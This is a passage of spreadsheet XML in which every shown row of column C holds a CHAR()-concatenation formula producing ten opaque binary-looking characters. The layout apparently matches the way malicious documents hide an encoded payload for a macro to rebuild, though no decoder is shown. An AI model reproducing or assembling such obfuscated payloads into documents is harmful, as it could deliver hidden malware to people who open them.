        <f>CHAR(178)&amp;CHAR(132)&amp;CHAR(72)&amp;CHAR(203)&amp;CHAR(158)&amp;CHAR(207)&amp;CHAR(82)&amp;CHAR(193)&amp;CHAR(134)&amp;CHAR(186)</f>
        <v>²„HËžÏRÁ†º</v>
      </c>
    </row>
    <row r="691" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C691" t="str">
        <f>CHAR(78)&amp;CHAR(198)&amp;CHAR(158)&amp;CHAR(188)&amp;CHAR(77)&amp;CHAR(240)&amp;CHAR(162)&amp;CHAR(188)&amp;CHAR(83)&amp;CHAR(204)</f>
        <v>NÆž¼Mð¢¼SÌ</v>
      </c>
    </row>
    <row r="692" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C692" t="str">
        <f>CHAR(153)&amp;CHAR(186)&amp;CHAR(74)&amp;CHAR(212)&amp;CHAR(165)&amp;CHAR(200)&amp;CHAR(77)&amp;CHAR(213)&amp;CHAR(175)&amp;CHAR(167)</f>
        <v>™ºJÔ¥ÈMÕ¯§</v>
      </c>
    </row>
    <row r="693" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C693" t="str">
        <f>CHAR(76)&amp;CHAR(212)&amp;CHAR(183)&amp;CHAR(172)&amp;CHAR(96)&amp;CHAR(209)&amp;CHAR(143)&amp;CHAR(189)&amp;CHAR(87)&amp;CHAR(211)</f>
        <v>LÔ·¬`Ñ½WÓ</v>
      </c>
    </row>
    <row r="694" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C694" t="str">
        <f>CHAR(163)&amp;CHAR(188)&amp;CHAR(68)&amp;CHAR(214)&amp;CHAR(251)&amp;CHAR(173)&amp;CHAR(119)&amp;CHAR(223)&amp;CHAR(190)&amp;CHAR(173)</f>
        <v>£¼DÖû­wß¾­</v>
      </c>
    </row>
    <row r="695" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C695" t="str">
        <f>CHAR(83)&amp;CHAR(204)&amp;CHAR(143)&amp;CHAR(135)&amp;CHAR(95)&amp;CHAR(223)&amp;CHAR(178)&amp;CHAR(164)&amp;CHAR(68)&amp;CHAR(214)</f>
        <v>SÌ‡_ß²¤DÖ</v>
      </c>
    </row>
    <row r="696" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C696" t="str">
        <f>CHAR(251)&amp;CHAR(171)&amp;CHAR(73)&amp;CHAR(242)&amp;CHAR(164)&amp;CHAR(173)&amp;CHAR(64)&amp;CHAR(209)&amp;CHAR(146)&amp;CHAR(160)</f>
        <v>û«Iò¤­@Ñ’ </v>
      </c>
    </row>
    <row r="697" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C697" t="str">
        <f>CHAR(80)&amp;CHAR(247)&amp;CHAR(186)&amp;CHAR(169)&amp;CHAR(70)&amp;CHAR(214)&amp;CHAR(251)&amp;CHAR(163)&amp;CHAR(78)&amp;CHAR(244)</f>
        <v>P÷º©FÖû£Nô</v>
      </c>
    </row>
    <row r="698" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C698" t="str">
        <f>CHAR(184)&amp;CHAR(190)&amp;CHAR(72)&amp;CHAR(215)&amp;CHAR(148)&amp;CHAR(161)&amp;CHAR(83)&amp;CHAR(212)&amp;CHAR(184)&amp;CHAR(188)</f>
        <v>¸¾H×”¡SÔ¸¼</v>
      </c>
    </row>
    <row r="699" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C699" t="str">
        <f>CHAR(33)&amp;CHAR(201)&amp;CHAR(139)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(195)&amp;CHAR(164)&amp;CHAR(173)&amp;CHAR(79)&amp;CHAR(209)</f>
        <v>!É‹ŒKÃ¤­OÑ</v>
      </c>
    </row>
    <row r="700" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C700" t="str">
        <f>CHAR(191)&amp;CHAR(166)&amp;CHAR(76)&amp;CHAR(212)&amp;CHAR(181)&amp;CHAR(188)&amp;CHAR(78)&amp;CHAR(215)&amp;CHAR(130)&amp;CHAR(207)</f>
        <v>¿¦LÔµ¼N×‚Ï</v>
      </c>
    </row>
    <row r="701" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C701" t="str">
        <f>CHAR(82)&amp;CHAR(193)&amp;CHAR(133)&amp;CHAR(188)&amp;CHAR(64)&amp;CHAR(215)&amp;CHAR(143)&amp;CHAR(186)&amp;CHAR(78)&amp;CHAR(248)</f>
        <v>RÁ…¼@×ºNø</v>
      </c>
    </row>
    <row r="702" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C702" t="str">
        <f>CHAR(184)&amp;CHAR(174)&amp;CHAR(78)&amp;CHAR(165)&amp;CHAR(151)&amp;CHAR(191)&amp;CHAR(110)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(171)</f>
        <v>¸®N¥—¿nÃ¹«</v>
      </c>
    </row>
    <row r="703" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C703" t="str">
        <f>CHAR(68)&amp;CHAR(214)&amp;CHAR(136)&amp;CHAR(134)&amp;CHAR(80)&amp;CHAR(215)&amp;CHAR(185)&amp;CHAR(186)&amp;CHAR(76)&amp;CHAR(196)</f>
        <v>DÖˆ†P×¹ºLÄ</v>
      </c>
    </row>
    <row r="704" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C704" t="str">
        <f>CHAR(143)&amp;CHAR(166)&amp;CHAR(81)&amp;CHAR(223)&amp;CHAR(214)&amp;CHAR(154)&amp;CHAR(68)&amp;CHAR(214)&amp;CHAR(142)&amp;CHAR(162)</f>
        <v>¦QßÖšDÖŽ¢</v>
      </c>
    </row>
    <row r="705" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C705" t="str">
        <f>CHAR(91)&amp;CHAR(229)&amp;CHAR(190)&amp;CHAR(186)&amp;CHAR(68)&amp;CHAR(196)&amp;CHAR(159)&amp;CHAR(207)&amp;CHAR(109)&amp;CHAR(196)</f>
        <v>[å¾ºDÄŸÏmÄ</v>
      </c>
    </row>
    <row r="706" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C706" t="str">
        <f>CHAR(165)&amp;CHAR(184)&amp;CHAR(68)&amp;CHAR(203)&amp;CHAR(159)&amp;CHAR(155)&amp;CHAR(86)&amp;CHAR(195)&amp;CHAR(179)&amp;CHAR(169)</f>
        <v>¥¸DËŸ›VÃ³©</v>
      </c>
    </row>
    <row r="707" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C707" t="str">
        <f>CHAR(69)&amp;CHAR(165)&amp;CHAR(180)&amp;CHAR(173)&amp;CHAR(84)&amp;CHAR(212)&amp;CHAR(181)&amp;CHAR(188)&amp;CHAR(33)&amp;CHAR(230)</f>
        <v>E¥´­TÔµ¼!æ</v>
      </c>
    </row>
    <row r="708" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C708" t="str">
        <f>CHAR(148)&amp;CHAR(162)&amp;CHAR(78)&amp;CHAR(216)&amp;CHAR(186)&amp;CHAR(173)&amp;CHAR(83)&amp;CHAR(226)&amp;CHAR(158)&amp;CHAR(161)</f>
        <v>”¢NØº­Sâž¡</v>
      </c>
    </row>
    <row r="709" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C709" t="str">
        <f>CHAR(91)&amp;CHAR(195)&amp;CHAR(183)&amp;CHAR(188)&amp;CHAR(68)&amp;CHAR(193)&amp;CHAR(186)&amp;CHAR(187)&amp;CHAR(74)&amp;CHAR(195)</f>
        <v>[Ã·¼DÁº»JÃ</v>
      </c>
    </row>
    <row r="710" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C710" t="str">
        <f>CHAR(191)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(209)&amp;CHAR(158)&amp;CHAR(207)&amp;CHAR(115)&amp;CHAR(208)&amp;CHAR(191)&amp;CHAR(166)</f>
        <v>¿ªTÑžÏsÐ¿¦</v>
      </c>
    </row>
    <row r="711" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C711" t="str">
        <f>CHAR(33)&amp;CHAR(139)&amp;CHAR(152)&amp;CHAR(172)&amp;CHAR(74)&amp;CHAR(222)&amp;CHAR(164)&amp;CHAR(200)&amp;CHAR(100)&amp;CHAR(203)</f>
        <v>!‹˜¬JÞ¤ÈdË</v>
      </c>
    </row>
    <row r="712" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C712" t="str">
        <f>CHAR(142)&amp;CHAR(162)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(183)&amp;CHAR(164)&amp;CHAR(84)&amp;CHAR(192)&amp;CHAR(175)&amp;CHAR(182)</f>
        <v>Ž¢&gt;ç·¤TÀ¯¶</v>
      </c>
    </row>
    <row r="713" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C713" t="str">
        <f>CHAR(78)&amp;CHAR(212)&amp;CHAR(214)&amp;CHAR(151)&amp;CHAR(68)&amp;CHAR(221)&amp;CHAR(152)&amp;CHAR(170)&amp;CHAR(82)&amp;CHAR(223)</f>
        <v>NÔÖ—DÝ˜ªRß</v>
      </c>
    </row>
    <row r="714" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C714" t="str">
        <f>CHAR(162)&amp;CHAR(172)&amp;CHAR(78)&amp;CHAR(203)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(97)&amp;CHAR(199)&amp;CHAR(153)&amp;CHAR(158)</f>
        <v>¢¬NËŽ»aÇ™ž</v>
      </c>
    </row>
    <row r="715" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C715" t="str">
        <f>CHAR(89)&amp;CHAR(214)&amp;CHAR(149)&amp;CHAR(157)&amp;CHAR(122)&amp;CHAR(177)&amp;CHAR(132)&amp;CHAR(189)&amp;CHAR(79)&amp;CHAR(209)</f>
        <v>YÖ•z±„½OÑ</v>
      </c>
    </row>
    <row r="716" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C716" t="str">
        <f>CHAR(146)&amp;CHAR(162)&amp;CHAR(91)&amp;CHAR(242)&amp;CHAR(185)&amp;CHAR(165)&amp;CHAR(81)&amp;CHAR(196)&amp;CHAR(143)&amp;CHAR(166)</f>
        <v>’¢[ò¹¥QÄ¦</v>
      </c>
    </row>
    <row r="717" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C717" t="str">
        <f>CHAR(92)&amp;CHAR(216)&amp;CHAR(186)&amp;CHAR(161)&amp;CHAR(85)&amp;CHAR(220)&amp;CHAR(186)&amp;CHAR(187)&amp;CHAR(74)&amp;CHAR(195)</f>
        <v>\Øº¡UÜº»JÃ</v>
      </c>
    </row>
    <row r="718" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C718" t="str">
        <f>CHAR(191)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(209)&amp;CHAR(158)&amp;CHAR(207)&amp;CHAR(83)&amp;CHAR(194)&amp;CHAR(181)&amp;CHAR(167)</f>
        <v>¿ªTÑžÏSÂµ§</v>
      </c>
    </row>
    <row r="719" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C719" t="str">
        <f>CHAR(83)&amp;CHAR(201)&amp;CHAR(146)&amp;CHAR(173)&amp;CHAR(62)&amp;CHAR(238)&amp;CHAR(179)&amp;CHAR(176)&amp;CHAR(66)&amp;CHAR(192)</f>
        <v>SÉ’­&gt;î³°BÀ</v>
      </c>
    </row>
    <row r="720" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C720" t="str">
        <f>CHAR(151)&amp;CHAR(161)&amp;CHAR(74)&amp;CHAR(213)&amp;CHAR(185)&amp;CHAR(166)&amp;CHAR(84)&amp;CHAR(209)&amp;CHAR(164)&amp;CHAR(185)</f>
        <v>—¡JÕ¹¦TÑ¤¹</v>
      </c>
    </row>
    <row r="721" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C721" t="str">
        <f>CHAR(113)&amp;CHAR(231)&amp;CHAR(174)&amp;CHAR(187)&amp;CHAR(79)&amp;CHAR(247)&amp;CHAR(191)&amp;CHAR(225)&amp;CHAR(91)&amp;CHAR(201)</f>
        <v>qç®»O÷¿á[É</v>
      </c>
    </row>
    <row r="722" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C722" t="str">
        <f>CHAR(179)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(250)&amp;CHAR(207)&amp;CHAR(5)&amp;CHAR(242)&amp;CHAR(214)&amp;CHAR(242)</f>
        <v>³È!¥úÏ_x0005_òÖò</v>
      </c>
    </row>
    <row r="723" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C723" t="str">
        <f>CHAR(33)&amp;CHAR(249)&amp;CHAR(251)&amp;CHAR(152)&amp;CHAR(62)&amp;CHAR(216)&amp;CHAR(214)&amp;CHAR(166)&amp;CHAR(33)&amp;CHAR(193)</f>
        <v>!ùû˜&gt;ØÖ¦!Á</v>
      </c>
    </row>
    <row r="724" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C724" t="str">
        <f>CHAR(251)&amp;CHAR(160)&amp;CHAR(62)&amp;CHAR(198)&amp;CHAR(214)&amp;CHAR(187)&amp;CHAR(33)&amp;CHAR(249)&amp;CHAR(251)&amp;CHAR(156)</f>
        <v>û &gt;ÆÖ»!ùûœ</v>
      </c>
    </row>
    <row r="725" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C725" t="str">
        <f>CHAR(62)&amp;CHAR(200)&amp;CHAR(214)&amp;CHAR(187)&amp;CHAR(33)&amp;CHAR(209)&amp;CHAR(251)&amp;CHAR(170)&amp;CHAR(62)&amp;CHAR(220)</f>
        <v>&gt;ÈÖ»!Ñûª&gt;Ü</v>
      </c>
    </row>
    <row r="726" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C726" t="str">
        <f>CHAR(214)&amp;CHAR(251)&amp;CHAR(33)&amp;CHAR(151)&amp;CHAR(251)&amp;CHAR(147)&amp;CHAR(62)&amp;CHAR(220)&amp;CHAR(214)&amp;CHAR(187)</f>
        <v>Öû!—û“&gt;ÜÖ»</v>
      </c>
    </row>
    <row r="727" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C727" t="str">
        <f>CHAR(33)&amp;CHAR(209)&amp;CHAR(251)&amp;CHAR(188)&amp;CHAR(62)&amp;CHAR(210)&amp;CHAR(214)&amp;CHAR(230)&amp;CHAR(33)&amp;CHAR(192)</f>
        <v>!Ñû¼&gt;ÒÖæ!À</v>
      </c>
    </row>
    <row r="728" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C728" t="str">
        <f>CHAR(251)&amp;CHAR(183)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(108)&amp;CHAR(64)&amp;CHAR(190)</f>
        <v>û·&gt;ÔÖÈ!l@¾</v>
      </c>
    </row>
    <row r="729" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C729" t="str">
        <f>CHAR(90)&amp;CHAR(47)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(100)&amp;CHAR(44)&amp;CHAR(145)&amp;CHAR(176)&amp;CHAR(215)&amp;CHAR(235)</f>
        <v>Z/_x0002_d,‘°×ë</v>
      </c>
    </row>
    <row r="730" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C730" t="str">
        <f>CHAR(173)&amp;CHAR(67)&amp;CHAR(176)&amp;CHAR(165)&amp;CHAR(249)&amp;CHAR(201)&amp;CHAR(55)&amp;CHAR(179)&amp;CHAR(208)&amp;CHAR(192)</f>
        <v>­C°¥ùÉ7³ÐÀ</v>
      </c>
    </row>
    <row r="731" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C731" t="str">
        <f>CHAR(34)&amp;CHAR(163)&amp;CHAR(234)&amp;CHAR(195)&amp;CHAR(61)&amp;CHAR(183)&amp;CHAR(199)&amp;CHAR(216)&amp;CHAR(35)&amp;CHAR(163)</f>
        <v>"£êÃ=·ÇØ#£</v>
      </c>
    </row>
    <row r="732" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C732" t="str">
        <f>CHAR(227)&amp;CHAR(205)&amp;CHAR(56)&amp;CHAR(191)&amp;CHAR(212)&amp;CHAR(206)&amp;CHAR(39)&amp;CHAR(166)&amp;CHAR(253)&amp;CHAR(222)</f>
        <v>ãÍ8¿ÔÎ'¦ýÞ</v>
      </c>
    </row>
    <row r="733" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C733" t="str">
        <f>CHAR(34)&amp;CHAR(178)&amp;CHAR(246)&amp;CHAR(200)&amp;CHAR(32)&amp;CHAR(161)&amp;CHAR(250)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>"²öÈ ¡úÏ&gt;±</v>
      </c>
    </row>
    <row r="734" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C734" t="str">
        <f>CHAR(213)&amp;CHAR(206)&amp;CHAR(48)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(207)&amp;CHAR(60)&amp;CHAR(176)&amp;CHAR(196)&amp;CHAR(217)</f>
        <v>ÕÎ0üÏ&lt;°ÄÙ</v>
      </c>
    </row>
    <row r="735" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C735" t="str">
        <f>CHAR(48)&amp;CHAR(176)&amp;CHAR(254)&amp;CHAR(207)&amp;CHAR(63)&amp;CHAR(163)&amp;CHAR(203)&amp;CHAR(192)&amp;CHAR(37)&amp;CHAR(133)</f>
        <v>0°þÏ?£ËÀ%…</v>
      </c>
    </row>
    <row r="736" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C736" t="str">
        <f>CHAR(251)&amp;CHAR(221)&amp;CHAR(31)&amp;CHAR(180)&amp;CHAR(246)&amp;CHAR(201)&amp;CHAR(51)&amp;CHAR(128)&amp;CHAR(243)&amp;CHAR(204)</f>
        <v>ûÝ_x001F_´öÉ3€óÌ</v>
      </c>
    </row>
    <row r="737" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C737" t="str">
        <f>CHAR(30)&amp;CHAR(177)&amp;CHAR(222)&amp;CHAR(204)&amp;CHAR(222)&amp;CHAR(170)&amp;CHAR(228)&amp;CHAR(207)&amp;CHAR(58)&amp;CHAR(179)</f>
        <v>_x001E_±ÞÌÞªäÏ:³</v>
      </c>
    </row>
    <row r="738" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C738" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(161)&amp;CHAR(243)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(216)</f>
        <v>ÖÈ!¡óÏ&gt;±ÒØ</v>
      </c>
    </row>
    <row r="739" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C739" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(203)&amp;CHAR(30)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(37)&amp;CHAR(229)</f>
        <v>!¥ûË_x001E_±ÖÈ%å</v>
      </c>
    </row>
    <row r="740" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C740" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(181)&amp;CHAR(86)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(207)</f>
        <v>ûÏ&gt;µVÈ!¥ÿÏ</v>
      </c>
    </row>
    <row r="741" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C741" t="str">
        <f>CHAR(63)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(58)&amp;CHAR(177)</f>
        <v>?±ÖÌ!§ûÏ:±</v>
      </c>
    </row>
    <row r="742" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C742" t="str">
        <f>CHAR(210)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(161)&amp;CHAR(251)&amp;CHAR(223)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(200)</f>
        <v>ÒÈ!¡ûß&gt;±ÒÈ</v>
      </c>
    </row>
    <row r="743" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C743" t="str">
        <f>CHAR(33)&amp;CHAR(181)&amp;CHAR(251)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(37)&amp;CHAR(165)</f>
        <v>!µûË&gt;±ÖÈ%¥</v>
      </c>
    </row>
    <row r="744" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C744" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(63)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(161)&amp;CHAR(255)&amp;CHAR(207)</f>
        <v>ûÏ?µÖÈ!¡ÿÏ</v>
      </c>
    </row>
    <row r="745" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C745" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(222)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(207)&amp;CHAR(58)&amp;CHAR(177)</f>
        <v>&gt;±ÞÌ!¥ÿÏ:±</v>
      </c>
    </row>
    <row r="746" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C746" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(35)&amp;CHAR(161)&amp;CHAR(255)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(200)</f>
        <v>ÖÈ#¡ÿÏ&gt;±ÒÈ</v>
      </c>
    </row>
    <row r="747" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C747" t="str">
        <f>CHAR(33)&amp;CHAR(173)&amp;CHAR(251)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(34)&amp;CHAR(165)</f>
        <v>!­ûË&gt;±×È"¥</v>
      </c>
    </row>
    <row r="748" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C748" t="str">
        <f>CHAR(251)&amp;CHAR(206)&amp;CHAR(43)&amp;CHAR(182)&amp;CHAR(216)&amp;CHAR(213)&amp;CHAR(36)&amp;CHAR(171)&amp;CHAR(234)&amp;CHAR(215)</f>
        <v>ûÎ+¶ØÕ$«ê×</v>
      </c>
    </row>
    <row r="749" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C749" t="str">
        <f>CHAR(47)&amp;CHAR(165)&amp;CHAR(212)&amp;CHAR(208)&amp;CHAR(57)&amp;CHAR(167)&amp;CHAR(242)&amp;CHAR(221)&amp;CHAR(35)&amp;CHAR(163)</f>
        <v>/¥ÔÐ9§òÝ#£</v>
      </c>
    </row>
    <row r="750" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C750" t="str">
        <f>CHAR(247)&amp;CHAR(208)&amp;CHAR(57)&amp;CHAR(189)&amp;CHAR(252)&amp;CHAR(207)&amp;CHAR(61)&amp;CHAR(169)&amp;CHAR(199)&amp;CHAR(212)</f>
        <v>÷Ð9½üÏ=©ÇÔ</v>
      </c>
    </row>
    <row r="751" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C751" t="str">
        <f>CHAR(35)&amp;CHAR(173)&amp;CHAR(241)&amp;CHAR(207)&amp;CHAR(59)&amp;CHAR(179)&amp;CHAR(206)&amp;CHAR(208)&amp;CHAR(60)&amp;CHAR(160)</f>
        <v>#­ñÏ;³ÎÐ&lt; </v>
      </c>
    </row>
    <row r="752" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C752" t="str">
        <f>CHAR(243)&amp;CHAR(223)&amp;CHAR(38)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(203)&amp;CHAR(57)&amp;CHAR(189)&amp;CHAR(227)&amp;CHAR(215)</f>
        <v>óß&amp;·ÖË9½ã×</v>
      </c>
    </row>
    <row r="753" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C753" t="str">
        <f>CHAR(54)&amp;CHAR(177)&amp;CHAR(211)&amp;CHAR(208)&amp;CHAR(57)&amp;CHAR(189)&amp;CHAR(243)&amp;CHAR(198)&amp;CHAR(55)&amp;CHAR(184)</f>
        <v>6±ÓÐ9½óÆ7¸</v>
      </c>
    </row>
    <row r="754" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C754" t="str">
        <f>CHAR(214)&amp;CHAR(205)&amp;CHAR(35)&amp;CHAR(189)&amp;CHAR(227)&amp;CHAR(199)&amp;CHAR(55)&amp;CHAR(161)&amp;CHAR(223)&amp;CHAR(218)</f>
        <v>ÖÍ#½ãÇ7¡ßÚ</v>
      </c>
    </row>
    <row r="755" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C755" t="str">
        <f>CHAR(33)&amp;CHAR(175)&amp;CHAR(249)&amp;CHAR(193)&amp;CHAR(48)&amp;CHAR(169)&amp;CHAR(206)&amp;CHAR(202)&amp;CHAR(48)&amp;CHAR(181)</f>
        <v>!¯ùÁ0©ÎÊ0µ</v>
      </c>
    </row>
    <row r="756" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C756" t="str">
        <f>CHAR(227)&amp;CHAR(193)&amp;CHAR(46)&amp;CHAR(160)&amp;CHAR(206)&amp;CHAR(216)&amp;CHAR(48)&amp;CHAR(177)&amp;CHAR(255)&amp;CHAR(207)</f>
        <v>ãÁ. ÎØ0±ÿÏ</v>
      </c>
    </row>
    <row r="757" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C757" t="str">
        <f>CHAR(63)&amp;CHAR(184)&amp;CHAR(206)&amp;CHAR(214)&amp;CHAR(32)&amp;CHAR(165)&amp;CHAR(250)&amp;CHAR(207)&amp;CHAR(106)&amp;CHAR(179)</f>
        <v>?¸ÎÖ ¥úÏj³</v>
      </c>
    </row>
    <row r="758" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C758" t="str">
        <f>CHAR(192)&amp;CHAR(159)&amp;CHAR(83)&amp;CHAR(196)&amp;CHAR(139)&amp;CHAR(129)&amp;CHAR(81)&amp;CHAR(223)&amp;CHAR(147)&amp;CHAR(176)</f>
        <v>ÀŸSÄ‹Qß“°</v>
      </c>
    </row>
    <row r="759" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C759" t="str">
        <f>CHAR(66)&amp;CHAR(192)&amp;CHAR(139)&amp;CHAR(187)&amp;CHAR(87)&amp;CHAR(222)&amp;CHAR(184)&amp;CHAR(156)&amp;CHAR(73)&amp;CHAR(215)</f>
        <v>BÀ‹»WÞ¸œI×</v>
      </c>
    </row>
    <row r="760" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C760" t="str">
        <f>CHAR(148)&amp;CHAR(184)&amp;CHAR(77)&amp;CHAR(176)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(15)&amp;CHAR(164)&amp;CHAR(123)&amp;CHAR(75)</f>
        <v>”¸M°VV_x000F_¤{K</v>
      </c>
    </row>
    <row r="761" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C761" t="str">
        <f>CHAR(109)&amp;CHAR(200)&amp;CHAR(165)&amp;CHAR(188)&amp;CHAR(68)&amp;CHAR(200)&amp;CHAR(213)&amp;CHAR(156)&amp;CHAR(91)&amp;CHAR(210)</f>
        <v>mÈ¥¼DÈÕœ[Ò</v>
      </c>
    </row>
    <row r="762" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C762" t="str">
        <f>CHAR(163)&amp;CHAR(186)&amp;CHAR(72)&amp;CHAR(209)&amp;CHAR(130)&amp;CHAR(225)&amp;CHAR(110)&amp;CHAR(212)&amp;CHAR(164)&amp;CHAR(165)</f>
        <v>£ºHÑ‚ánÔ¤¥</v>
      </c>
    </row>
    <row r="763" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C763" t="str">
        <f>CHAR(72)&amp;CHAR(214)&amp;CHAR(136)&amp;CHAR(166)&amp;CHAR(81)&amp;CHAR(223)&amp;CHAR(165)&amp;CHAR(230)&amp;CHAR(114)&amp;CHAR(192)</f>
        <v>HÖˆ¦Qß¥ærÀ</v>
      </c>
    </row>
    <row r="764" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C764" t="str">
        <f>CHAR(152)&amp;CHAR(186)&amp;CHAR(76)&amp;CHAR(216)&amp;CHAR(162)&amp;CHAR(177)&amp;CHAR(113)&amp;CHAR(192)&amp;CHAR(137)&amp;CHAR(162)</f>
        <v>˜ºLØ¢±qÀ‰¢</v>
      </c>
    </row>
    <row r="765" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C765" t="str">
        <f>CHAR(87)&amp;CHAR(194)&amp;CHAR(165)&amp;CHAR(161)&amp;CHAR(78)&amp;CHAR(203)&amp;CHAR(186)&amp;CHAR(187)&amp;CHAR(74)&amp;CHAR(195)</f>
        <v>WÂ¥¡NËº»JÃ</v>
      </c>
    </row>
    <row r="766" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C766" t="str">
        <f>CHAR(191)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(209)&amp;CHAR(158)&amp;CHAR(227)&amp;CHAR(30)&amp;CHAR(220)&amp;CHAR(165)&amp;CHAR(171)</f>
        <v>¿ªTÑžã_x001E_Ü¥«</v>
      </c>
    </row>
    <row r="767" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C767" t="str">
        <f>CHAR(78)&amp;CHAR(215)&amp;CHAR(151)&amp;CHAR(166)&amp;CHAR(92)&amp;CHAR(157)&amp;CHAR(246)&amp;CHAR(158)&amp;CHAR(68)&amp;CHAR(215)</f>
        <v>N×—¦\öžD×</v>
      </c>
    </row>
